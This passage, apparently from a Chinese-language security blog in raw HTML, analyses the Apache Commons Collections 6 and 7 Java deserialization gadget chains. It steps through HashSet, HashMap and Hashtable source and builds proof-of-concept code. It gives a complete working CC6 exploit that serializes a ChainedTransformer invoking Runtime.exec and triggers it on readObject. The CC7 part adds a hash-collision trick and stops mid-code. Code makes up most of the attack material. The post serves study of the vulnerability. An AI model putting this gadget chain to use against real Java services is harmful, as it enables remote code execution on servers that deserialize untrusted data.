class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204184034975.png" alt="image-20211204184034975"></p>
<h4 id="调用hash-处二（方法二）："><a href="#调用hash-处二（方法二）：" class="headerlink" title="调用hash()处二（方法二）："></a>调用hash()处二（方法二）：</h4><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><p>经过分析，我们发现<code>HashMap.put()</code>方法也会导致利用链触发（也正是它给我们在方法一的实现中带来了坑）</p>
<p>那么我们有没有什么办法直接让程序call到<code>HashMap.put()</code>，就让它成为利用链中一部分呢？</p>
<p><code>HashSet</code>成为了我们的首选。</p>
<h5 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a>HashSet.readObject()</h5><p>我们发现<code>HashSet.readObject()</code>中call 到了put()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 此处判断是否为LinkedHashSet类型，如果不是就创建HashMap */</span></span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);<span class="comment">//这里call到了put</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们能让<code>map</code>变量为我们的HashMap就能连上了。我们发现在该方法下会重建一个新的map，而这个map就是<strong>HashMap</strong>类型。 如果我们直接把这个内部的<strong>HashMap</strong>拿来用，把这个内部的<strong>HashMap</strong>的key值改为<strong>tiedMapEntry</strong>，当他被call <code>put()</code>的时候，利用链就能被成功执行了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211205094232431.png" alt="image-20211205094232431"></p>
<p>我们跟到<code>HashSet.readObject()</code>看一下，看看这个<code>e</code>是怎么来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size</span></span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())<span class="comment">//e是通过hashmap的keySet来的</span></span><br><span class="line">        s.writeObject(e);<span class="comment">//e被序列化了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就很明显了，它会把变量<code>map</code>里的<code>key-value</code>对给序列化，如果我们变量<code>map</code>已经有值，那么它的内容就会被序列化 -》从而在readObject()反序列化的时候这些内容又会被反序列化从而触发漏洞 -》 这里引出后面的用反射修改<code>map</code>。</p>
<h5 id="HashSet-add"><a href="#HashSet-add" class="headerlink" title="HashSet.add()"></a>HashSet.add()</h5><p><code>HashSet.add()</code>会向map(hashmap)中添加一个key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="POC构造-1"><a href="#POC构造-1" class="headerlink" title="POC构造"></a>POC构造</h5><p>我们已经得知，HashSet中会生成一个HashMap，所以我们不再需要自己构造了HashMap了。我们的思路如下：先用hashSet生成一个带任意key值的hashMap，我们用反射的方式得到这个map，最后再用反射的方式从这个<strong>map</strong>中修改<strong>key</strong>。</p>
<p>在HashMap中，键值对是被存储在<code>table</code>变量中的，这个看代码直接能看出来。</p>
<p><strong>完整POC如下</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6Method2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//这是真的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HashSet的时候，其内部已经创建了一个hashmap，我们只需要把这个内部生成的hashmap的key值改为tiedMapEntry，当他被call put的时候，利用链就成功执行了。</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(<span class="string">&quot;111&quot;</span>);<span class="comment">//先随意给内部的map添加一个key</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> hashSet.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);<span class="comment">//得到这个map Field</span></span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mapInHashSet</span> <span class="operator">=</span> (HashMap) map.get(hashSet);<span class="comment">//得到这个map的内容 -》也就是hashMap</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> mapInHashSet.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);<span class="comment">//从这个hashmap中获取table field</span></span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(mapInHashSet);<span class="comment">//这个table field里面包含了由各种键值对组成的数组</span></span><br><span class="line">        <span class="comment">// 我们的目的是修改那个我们之前放进去的key值，让他等于tiedMapEntry</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (Object i : array)&#123;<span class="comment">//遍历这个键值对数组，如果不为空，就赋值给node，从而得到一对键值对</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="literal">null</span>)&#123;</span><br><span class="line">                node=i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 修改其中的key值 */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashSet);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>cc6中用<code>fakeTransformer</code>来绕过命令重复执行可以说是非常好的思路了，自己在审计的时候也可以学习这方面思路。</p>
<h3 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/233410#h3-8">ysoserial CommonsCollections5/6 详细分析</a></p>
<p><a href="https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">Java安全-CommonsCollections6利用链分析</a></p>
<h2 id="Commons-Collections-7"><a href="#Commons-Collections-7" class="headerlink" title="Commons Collections 7"></a>Commons Collections 7</h2><h3 id="环境搭建-6"><a href="#环境搭建-6" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7</li>
</ul>
<h3 id="利用链构造-3"><a href="#利用链构造-3" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h4><p><code>LazyMap.get()</code>之后得步骤和之前的cc链都差不多，这里就不再说了。</p>
<h4 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h4><p>我们在<code>AbstractMap.equals()</code>中发现了<code>.get()</code>方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206194914358.png" alt="image-20211206194914358"></p>
<p>如果我们能够控制变量<code>m</code>为lazyMap的话，就能连上利用链了。</p>
<p>那么什么调用了<code>AbstractMap.equals()</code>呢？</p>
<h4 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a>Hashtable.reconstitutionPut()</h4><p>我们发现在<code>Hashtable</code>中，<code>reconstitutionPut()</code>方法调用了<code>e.key.equals()</code>，既然我们想要call到<code>AbstractMap.equals()</code>,那我们让传入的<strong>e.key</strong>变成<code>AbstractMap</code>是不是就可以了呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="comment">//e=传入table里的第一个key-value对</span></span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<span class="comment">//此处调用了equals()</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现<code>HashMap</code>继承了<code>AbstractMap</code>，如果我们的变量<code>e</code>为<code>lazyMap</code>，它的key值则为<code>hashMap</code>，从而我们会call到**hashMap的equals()**，就能触发漏洞了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206200746114.png" alt="image-20211206200746114"></p>
<h4 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a>Hashtable.readObject()</h4><p>跟踪发现<code>reconstitutionPut()</code>刚好会被<code>Hashtable.readObject()</code>所调用。此处的<code>newTable</code>是新的，我们无法赋值，但是在<code>reconstitutionPut()</code>方法中，我们可以看到在for循环后面，有一句<code>tab[index] = new Entry&lt;&gt;(hash, key, value, e);</code></p>
<p>这是将我们的key-value对存入这个<strong>tab</strong>中，而这个tab正好对应了<code>readObjcet()</code>里的<strong>newTable</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206201003311.png" alt="image-20211206201003311"></p>
<hr>
<p><strong>遇到的一些困惑：</strong></p>
<p>起初我很疑惑<strong>newTable</strong>和<strong>tab</strong>的关系，后来我明白了，<strong>newTable</strong>作为参数<strong>tab</strong>传入<code>reconstitutionPut()</code>后，在<code>reconstitutionPut()</code>中对<strong>tab</strong>的变化也是会影响到<strong>newTable</strong>的 - 也就是所谓的<strong>sideffect</strong>，下面我做了个实验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">teacher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>(<span class="number">28</span>);<span class="comment">//创建一个28岁的老师</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(teacher);<span class="comment">//把老师的instance传给学生</span></span><br><span class="line">        <span class="comment">//学生会把传给它的老师改成53岁</span></span><br><span class="line">        System.out.println(teacher.getAge());<span class="comment">//打印老师的年龄</span></span><br><span class="line">        <span class="comment">//输出结果为53岁</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(Teacher teacher)</span>&#123;</span><br><span class="line">        teacher.modifyAge(<span class="number">53</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>再看<code>Hashtable.writeObject()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Entry&lt;K, V&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out length, count of elements</span></span><br><span class="line">        s.writeInt(table.length);</span><br><span class="line">        s.writeInt(count);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                entryStack =</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                entry = entry.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">    <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">        s.writeObject(entryStack.key);</span><br><span class="line">        s.writeObject(entryStack.value);</span><br><span class="line">        entryStack = entryStack.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将Hashtable里的key-value对给序列化了。</p>
<p>因此我们只需要构造key值为<strong>lazyMap</strong>就可以了。</p>
<p>我们初步的POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是这个POC是有问题的。</p>
<h4 id="两个LazyMap"><a href="#两个LazyMap" class="headerlink" title="两个LazyMap"></a>两个LazyMap</h4><p>在<code>Hashtable.reconstitutionPut()</code>中，<strong>for循环</strong>里触发了我们的利用链。但如果我们<strong>tab</strong>里只有一个key-value对，那么就不会再触发了，因为第一次加入key-value对时tab里面没有值，是不会进入for循环的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="comment">//如果tab里为空，不会进入for循环</span></span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 只会直接添加key-value到这个tab里</span></span><br><span class="line">Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">count++;</span><br></pre></td></tr></table></figure>

<p>所以我们需要添加两个<strong>lazyMap</strong>,而第二个<strong>lazyMap</strong>才能让我们进入<strong>for循环</strong></p>
<p>改进后POC如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap2.put(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>可是这样的POC依然不对。</p>
<h4 id="一样的hash"><a href="#一样的hash" class="headerlink" title="一样的hash"></a>一样的hash</h4><p>依然是for循环的毛病</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"><span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="comment">//如果tab里为空，不会进入for循环</span></span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们现在已经put了第一个key-value对，现在tab的内容如下</p>
<ul>
<li><code>&lt;lazyMap,1&gt;</code></li>
</ul>
<p>当我们用第二个<code>&lt;lazyMap2,2&gt;</code>开始执行<strong>for loop</strong>的时候，会判断<strong>tab[index]<strong>是否为空，如果tab里面不存在，那么就不能进入</strong>for循环</strong>（太坑了）- 意味着我们第一次的**hash(key)<strong>和第二次的</strong>hash(key)**必须一样</p>
<p>经测试当lazyMap的key值为xx和zZ时，得到的hashCode是一样的，所以我们能够进入for循环</p>
<p>现在的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span 